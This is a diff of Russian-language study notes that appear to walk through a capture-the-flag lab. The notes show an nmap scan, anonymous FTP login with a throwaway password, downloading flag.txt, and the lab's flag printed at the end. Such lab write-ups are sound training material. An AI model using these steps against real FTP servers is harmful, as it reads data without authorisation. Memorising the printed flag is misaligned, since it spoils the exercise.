@@ -3,10 +3,14 @@
 FTP
 
 	@ pacman -S lftp // клиент для работы с ftp сервером
+	@ pacman -S ftp  // базовый клиент для взаимодействия с ftp  cервером
 
-	@ sudo nmap <ip > 
+	@ sudo nmap -sV <ip> 
 		
-		21 ftp
+		21/tcp	open	ftp
+
+
+### FIRST WAY: 
 
 	@ lftp <ip> // automatic anonim autorize
 		
@@ -19,3 +23,56 @@ FTP
 
 	@ cat flag.txt 
 
+### BASIC WAY:
+	
+	@ ftp -h # проверить доступные функции клиента ftp
+
+		...
+		# для подключения достаточно будет использовать ftp без флага, только
+		лишь с указанием цели
+
+	@ ftp  <target ip>
+
+		Connected to 10.129.73.184.
+		220 (vsFTPd 3.0.3)
+		Name (10.129.73.184:mwuckert): anonymous
+		331 Please specify the password.
+		Password: jopa123
+		230 Login successful.
+			
+			# Как видно авторизация успешна при рандомном пароле, это
+			обусловленно тем, что учетная запись anonymous не требует пароля.
+			Поэтому неотключенная запись anonymous являеися потенциально
+			опасной уязвимостью
+
+		@ftp> help
+				
+			# help выведет список доступных команд (В основном UNIX подобных)
+			# get - команда потребуется для скачивания файлов с ftp сервера
+
+		@ftp> ls 
+			
+			200 PORT command successful. Consider using PASV.
+			150 Here comes the directory listing.
+			-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+			226 Directory send OK.
+
+		@ftp> get flag.txt 
+			
+			150 Opening BINARY mode data connection for flag.txt (32 bytes).
+			226 Transfer complete.
+			32 bytes received in 0.00239 seconds (13.1 kbytes/s)
+
+			# Файл успешно скачан, отключаемся от сервера
+
+		@ftp> bye
+
+	### Прочитаем скачанный файл в текущей дирректории
+	
+	@ ls 
+		
+		flag.txt
+	
+	@ cat flag.txt
+		
+		035db21c881520061c53e0536e44f815
